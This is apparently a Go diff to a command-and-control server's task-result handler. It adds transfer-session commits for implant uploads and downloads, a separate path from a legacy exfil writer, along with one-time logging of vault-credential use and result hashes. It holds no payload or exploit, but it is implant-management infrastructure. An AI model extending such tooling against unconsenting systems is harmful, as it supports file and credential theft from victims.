@@ -3,6 +3,7 @@ package server
 import (
 	"context"
 	"encoding/base64"
+	"errors"
 	"fmt"
 	"log/slog"
 	"strconv"
@@ -225,6 +226,30 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 			continue
 		}
 
+		// Durable transfer sessions commit their bytes, ledger, session offset
+		// and task finality in one locked pass. Skipping the generic file-chunk
+		// path matters: a paused/cancelled session must never stage bytes via
+		// the legacy exfil writer just because its task row is still live.
+		if task.TransferID != nil && (task.Type == "upload" || task.Type == "download") {
+			handled, terr := s.commitTransferChunk(agent, r, task, now)
+			if handled {
+				if terr != nil && !errors.Is(terr, errTransferStale) {
+					slog.Warn("Transfer chunk rejected", "agent_id", uuid, "task_id", task.ID, "transfer_id", *task.TransferID, "error", terr)
+				}
+				if s.eventManager != nil {
+					evtType := EventTaskComplete
+					if task.Status == "failed" {
+						evtType = EventTaskFail
+					}
+					s.eventManager.Emit(Event{
+						Type: evtType, AgentID: uuid, AgentHost: agent.Hostname, AgentIP: agent.IP,
+						TaskID: task.ID, Timestamp: now,
+						Data: map[string]interface{}{"type": task.Type, "status": task.Status, "command": "file_transfer"},
+					})
+				}
+				continue
+			}
+		}
 		// Chunked screenshots: stage each part under the capture task id and
 		// keep the task running. The server cannot render a capture that only
 		// exists as chunks, so completing on the first chunk was a lie.
@@ -295,6 +320,19 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 			continue
 		}
 		task.Status = finalStatus
+		// Vault-backed work writes exactly one ledger row, even when the
+		// agent re-sends the result with a fresh result id.
+		if task.CredentialID != nil {
+			if action, result := credentialUsageForResult(task.Type, r.Error, r.Output); action != "" {
+				_ = s.recordCredentialUsageOnce(*task, action, result, "")
+			}
+		}
+		if r.SHA256 != "" {
+			task.ResultSHA256 = r.SHA256
+		}
+		if r.Mtime > 0 {
+			task.ResultModTime = r.Mtime
+		}
 		if r.Error != "" {
 			task.Error = r.Error
 		} else if fileChunkErr != nil {
@@ -489,13 +527,15 @@ func (s *Server) processTaskResults(agent db.Implant, results []taskResult, uuid
 		}
 		if err := s.withBusyRetryDB("result", func() *gorm.DB {
 			return s.db.Model(task).Updates(map[string]interface{}{
-				"status":         task.Status,
-				"result":         dbTask.Result,
-				"error":          dbTask.Error,
-				"progress":       task.Progress,
-				"total_bytes":    task.TotalBytes,
-				"transferred":    task.Transferred,
-				"last_result_id": task.LastResultID,
+				"status":          task.Status,
+				"result":          dbTask.Result,
+				"error":           dbTask.Error,
+				"progress":        task.Progress,
+				"total_bytes":     task.TotalBytes,
+				"transferred":     task.Transferred,
+				"last_result_id":  task.LastResultID,
+				"result_sha256":   task.ResultSHA256,
+				"result_mod_time": task.ResultModTime,
 			})
 		}).Error; err != nil {
 			slog.Error("Failed to save task result", "task_id", task.ID, "agent_id", uuid, "type", r.Type, "error", err)
